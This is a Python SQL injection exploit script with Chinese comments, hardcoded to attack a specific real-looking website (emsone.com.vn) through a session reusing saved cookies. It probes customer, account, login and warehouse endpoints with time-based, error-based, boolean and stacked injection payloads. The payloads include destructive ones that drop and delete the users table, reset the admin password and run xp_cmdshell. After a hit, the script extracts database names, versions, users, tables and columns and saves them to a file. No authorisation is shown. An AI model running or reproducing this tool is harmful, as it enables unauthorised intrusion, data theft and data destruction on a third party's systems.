#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import time
import json
from urllib.parse import urljoin, quote, quote_plus
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings()

class SQLiExploit:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.vulnerabilities = []
        self.confirmed_sqli = []
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    # 时间盲注Payload
    TIME_BASED_PAYLOADS = [
        "' AND SLEEP(5)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "'; WAITFOR DELAY '00:00:05'--",
        "'; EXEC xp_cmdshell('ping -n 5 127.0.0.1')--",
        "' OR SLEEP(5)--",
        "1' AND SLEEP(5) AND '1'='1",
        "1' AND (SELECT COUNT(*) FROM sysobjects)>0 AND SLEEP(5)--",
        "1'; SELECT SLEEP(5);--",
        "1' UNION SELECT SLEEP(5),NULL,NULL--",
        "admin' AND SLEEP(5)--",
        "' OR 1=1 AND SLEEP(5)--",
        "') OR SLEEP(5)--",
        "') OR (SELECT SLEEP(5))--",
        "1' OR SLEEP(5) OR '1'='1",
    ]
    
    # 错误注入Payload
    ERROR_BASED_PAYLOADS = [
        "' OR 1=1--",
        "' OR '1'='1",
        "' OR 1=1#",
        "admin'--",
        "admin'/*",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "1' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT version(),user(),database()--",
        "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
        "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(0x7e,version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' OR 1=1 LIMIT 1--",
        "1' OR 1=1 LIMIT 1--",
        "' OR 1=1 LIMIT 1 OFFSET 0--",
        "1' AND 1=2 UNION SELECT NULL,NULL--",
        "' AND 1=2 UNION SELECT 1,2,3--",
        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' OR SLEEP(1) OR '1'='1",
        "1' OR SLEEP(1) OR '1'='1",
    ]
    
    # 布尔盲注Payload
    BOOLEAN_PAYLOADS = [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND 'a'='a",
        "' AND 'a'='b",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "' OR 1=1--",
        "' OR 1=2--",
        "admin' AND '1'='1",
        "admin' AND '1'='2",
        "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
        "' AND (SELECT SUBSTRING(@@version,1,1))='M'--",
        "1' AND ASCII(SUBSTRING((SELECT version()),1,1))>50--",
        "1' AND ASCII(SUBSTRING((SELECT version()),1,1))<50--",
    ]
    
    # 堆叠注入Payload
    STACKED_PAYLOADS = [
        "'; DROP TABLE users--",
        "'; DELETE FROM users--",
        "'; INSERT INTO users VALUES('admin','password')--",
        "'; UPDATE users SET password='hacked' WHERE username='admin'--",
        "1'; EXEC xp_cmdshell('whoami');--",
        "'; EXEC('SELECT 1');--",
    ]
    
    def test_time_based(self, url, param_name, param_value):
        """时间盲注测试"""
        base_time = time.time()
        try:
            r = self.session.get(url, timeout=8, params={param_name: param_value})
            elapsed = time.time() - base_time
            return elapsed
        except:
            return 0
    
    def test_error_based(self, url, param_name, param_value):
        """错误注入测试"""
        try:
            r = self.session.get(url, timeout=5, params={param_name: param_value})
            content_lower = r.text.lower()
            
            error_indicators = [
                'sql syntax', 'mysql', 'postgresql', 'oracle',
                'microsoft ole db', 'odbc', 'sqlserver',
                'warning:', 'error in your sql',
                'quoted string', 'unclosed quotation',
                'mysql_fetch', 'mysql_num_rows',
                'ora-', 'oracle error',
                'postgresql error', 'pg_query',
                'sqlite error', 'sqlite3',
                'warning: pg_', 'valid mysql result',
                'nzal', 'odbc sql server driver',
                'sql server driver', 'sqlcommand',
                'sqlite_exception', 'sqlstate',
                'syntax error', 'unexpected end',
                'sql error', 'sql exception',
            ]
            
            for indicator in error_indicators:
                if indicator in content_lower:
                    return True, indicator
            return False, None
        except:
            return False, None
    
    def test_boolean_based(self, url, param_name, true_payload, false_payload):
        """布尔盲注测试"""
        try:
            r1 = self.session.get(url, timeout=5, params={param_name: true_payload})
            r2 = self.session.get(url, timeout=5, params={param_name: false_payload})
            
            if len(r1.content) != len(r2.content):
                return True
            if r1.status_code != r2.status_code:
                return True
            return False
        except:
            return False
    
    def test_endpoint_sqli(self, endpoint, method='GET'):
        """测试端点SQL注入"""
        print(f"[*] 测试: {endpoint}")
        
        # 参数名猜测
        param_names = [
            'id', 'ID', 'Id', 'user_id', 'userID', 'userId',
            'name', 'Name', 'username', 'UserName', 'userName',
            'email', 'Email', 'mobile', 'Mobile', 'mobileNumber',
            'q', 'query', 'Query', 'search', 'Search', 'keyword',
            'page', 'Page', 'limit', 'Limit', 'offset', 'Offset',
            'type', 'Type', 'sort', 'Sort', 'order', 'Order',
            'districtID', 'DistrictID', 'provinceID', 'ProvinceID',
            'warehouseID', 'WareHouseID', 'wareHouseID',
            'groupPermissionID', 'GroupPermissionID',
            'customerID', 'CustomerID', 'customer_id',
        ]
        
        results = []
        
        # 解析端点
        if '?' in endpoint:
            base_url_part = endpoint.split('?')[0]
            existing_param = endpoint.split('?')[1].split('=')[0]
            param_names.insert(0, existing_param)
        else:
            base_url_part = endpoint
        
        url = urljoin(self.base_url, base_url_part)
        
        for param_name in param_names[:10]:  # 测试前10个参数
            # 时间盲注测试
            for payload in self.TIME_BASED_PAYLOADS[:5]:  # 前5个
                elapsed = self.test_time_based(url, param_name, payload)
                if elapsed >= 4.5:  # 延迟超过4.5秒
                    print(f"[!] 时间盲注: {url}?{param_name}={payload[:30]}... (延迟: {elapsed:.2f}s)")
                    results.append({
                        'type': 'Time-based SQL Injection',
                        'url': f"{url}?{param_name}={payload}",
                        'param': param_name,
                        'payload': payload,
                        'delay': elapsed
                    })
                    self.confirmed_sqli.append({
                        'endpoint': endpoint,
                        'param': param_name,
                        'payload': payload,
                        'type': 'time-based'
                    })
                    break
            
            # 错误注入测试
            for payload in self.ERROR_BASED_PAYLOADS[:10]:  # 前10个
                is_vuln, indicator = self.test_error_based(url, param_name, payload)
                if is_vuln:
                    print(f"[!] 错误注入: {url}?{param_name}={payload[:30]}... (错误: {indicator})")
                    results.append({
                        'type': 'Error-based SQL Injection',
                        'url': f"{url}?{param_name}={payload}",
                        'param': param_name,
                        'payload': payload,
                        'error': indicator
                    })
                    self.confirmed_sqli.append({
                        'endpoint': endpoint,
                        'param': param_name,
                        'payload': payload,
                        'type': 'error-based'
                    })
                    break
            
            # 布尔盲注测试
            true_payload = "' AND 1=1--"
            false_payload = "' AND 1=2--"
            if self.test_boolean_based(url, param_name, true_payload, false_payload):
                print(f"[!] 布尔盲注: {url}?{param_name}=...")
                results.append({
                    'type': 'Boolean-based SQL Injection',
                    'url': f"{url}?{param_name}={true_payload}",
                    'param': param_name,
                    'payload': true_payload
                })
                self.confirmed_sqli.append({
                    'endpoint': endpoint,
                    'param': param_name,
                    'payload': true_payload,
                    'type': 'boolean-based'
                })
        
        return results
    
    def test_all_endpoints(self):
        """测试所有端点"""
        endpoints = [
            "/Handle/SearchListCustomer",
            "/Handle/SearchListProvince",
            "/Handle/SearchListWardByDistrictID?DistrictID=",
            "/Handle/SearchListDistrictByProvinceID?ProvinceID=",
            "/Handle/SearchListWareHouse",
            "/Handle/SearchListProductVariantByWareHouseID?WareHouseID=",
            "/Handle/SearchListFunctionalByGroupPermissionID?GroupPermissionID=",
            "/Handle/SearchPWDByVNPMapsSearch",
            "/Handle/SearchPWDByEMSMapsSearch",
            "/Handle/SearchPWDByVMapCode",
            "/Account/GetUserInfo",
            "/Account/JLogin",
        ]
        
        all_results = []
        for endpoint in endpoints:
            results = self.test_endpoint_sqli(endpoint)
            all_results.extend(results)
            time.sleep(0.5)  # 避免请求过快
        
        return all_results
    
    def exploit_confirmed(self):
        """利用已确认的SQL注入"""
        print("\n[*] 利用已确认的SQL注入...")
        
        exploit_payloads = [
            ("数据库名", "1' UNION SELECT database(),NULL--"),
            ("版本", "1' UNION SELECT version(),NULL--"),
            ("用户", "1' UNION SELECT user(),NULL--"),
            ("表名", "1' UNION SELECT table_name,NULL FROM information_schema.tables LIMIT 1--"),
            ("列名", "1' UNION SELECT column_name,NULL FROM information_schema.columns LIMIT 1--"),
        ]
        
        for sqli in self.confirmed_sqli[:3]:  # 利用前3个
            endpoint = sqli['endpoint']
            param = sqli['param']
            
            if '?' in endpoint:
                base_url = endpoint.split('?')[0]
            else:
                base_url = endpoint
            
            url = urljoin(self.base_url, base_url)
            
            print(f"\n[+] 利用: {endpoint} (参数: {param})")
            for name, payload in exploit_payloads:
                try:
                    test_url = f"{url}?{param}={quote(payload)}"
                    r = self.session.get(test_url, timeout=10)
                    if r.status_code == 200 and len(r.content) > 10:
                        print(f"    {name}: {r.text[:200]}")
                except:
                    pass
    
    def run_all(self):
        """执行所有测试"""
        print("[*] 开始SQL注入深度测试...\n")
        
        results = self.test_all_endpoints()
        
        if self.confirmed_sqli:
            self.exploit_confirmed()
        
        # 保存结果
        with open('sqli_results.json', 'w', encoding='utf-8') as f:
            json.dump({
                'vulnerabilities': results,
                'confirmed': self.confirmed_sqli
            }, f, indent=2, ensure_ascii=False)
        
        print(f"\n[+] 发现 {len(results)} 个SQL注入漏洞")
        print(f"[+] 确认 {len(self.confirmed_sqli)} 个可利用")

if __name__ == "__main__":
    exploiter = SQLiExploit()
    exploiter.run_all()